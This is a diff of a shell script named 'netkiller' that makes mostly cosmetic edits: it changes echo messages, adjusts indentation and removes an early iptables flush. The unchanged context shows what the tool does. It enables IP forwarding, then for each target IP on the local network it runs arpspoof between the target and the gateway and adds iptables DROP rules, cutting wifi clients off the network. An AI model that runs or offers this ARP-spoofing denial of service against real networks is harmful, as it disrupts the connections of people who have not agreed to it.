@@ -70,10 +70,6 @@ echo ""
 # Enable IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Flush Iptables existing rules
-iptables -t nat -F
-iptables -F FORWARD
-
 # Create stop script
 cat > /bin/netkiller-stop << EOF
 #!/bin/sh
@@ -81,7 +77,9 @@ cat > /bin/netkiller-stop << EOF
 iptables -t nat -F
 iptables -F FORWARD
 pkill -f arpspoof
-echo "Restoring the Connections..."
+echo "Netkiller is stopped!"
+sleep 2s
+echo "Restoring the client connections..."
 EOF
 chmod 755 /bin/netkiller-stop
 
@@ -141,7 +139,6 @@ for TARGET in $TARGET_IPS; do
         echo "Skipping $TARGET (matches gateway or device IP)."
         continue
     fi
-
         # Block all traffic of the target wifi clients
         sudo iptables -I FORWARD -s "$TARGET" -j DROP
         sudo iptables -I FORWARD -d "$TARGET" -j DROP
@@ -155,7 +152,7 @@ for TARGET in $TARGET_IPS; do
        sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
      ) &
-      echo "Netkiller killing the target IP: $TARGET"
+       echo "Netkiller killing the target IP: $TARGET"
 done
 
 echo ""
